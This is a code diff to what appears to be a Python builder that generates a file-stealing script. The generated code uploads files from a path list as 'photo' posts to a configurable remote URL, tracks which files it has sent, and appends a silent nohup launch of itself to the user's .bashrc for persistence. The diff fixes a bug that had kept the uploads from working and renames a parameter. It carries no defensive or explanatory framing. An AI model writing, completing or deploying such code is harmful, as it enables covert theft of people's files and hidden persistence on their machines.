@@ -199,7 +199,7 @@ per()
        if not os.path.exists(self.done):
            with open(self.path,"r")as Fire:
                for i in Fire:
-                   self.PhpUpload(i.strip)
+                   self.PhpUpload(i.strip())
        else:
           with open(self.path,'r')as Water:
               done = open(self.done,'r').read()
@@ -207,10 +207,10 @@ per()
                   if i.strip() in done:
                       continue
               self.PhpUpload(i.strip())                   
-   def PhpUpload(self,files):
+   def PhpUpload(self,cont):
      try:
        s = open(self.done,"a")
-       with open(files,"rb")as women:
+       with open(cont,"rb")as women:
            mar = {{'photo':women}}
            send = requests.post("{y}",files=mar)
            if send.status_code ==200:
@@ -222,6 +222,7 @@ per()
        with open(self.bashrc,"w")as bash:
            bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
 Zeyad()
+
                       ''')
       else:
          with open(f"{x}.py","w")as files:
@@ -316,7 +317,7 @@ per()
        if not os.path.exists(self.done):
            with open(self.path,"r")as Fire:
                for i in Fire:
-                   self.PhpUpload(i.strip)
+                   self.PhpUpload(i.strip())
        else:
           with open(self.path,'r')as Water:
               done = open(self.done,'r').read()
@@ -324,10 +325,10 @@ per()
                   if i.strip() in done:
                       continue
               self.PhpUpload(i.strip())                   
-   def PhpUpload(self,files):
+   def PhpUpload(self,cont):
      try:
        s = open(self.done,"a")
-       with open(files,"rb")as women:
+       with open(cont,"rb")as women:
            mar = {{'photo':women}}
            send = requests.post("{y}",files=mar)
            if send.status_code ==200:
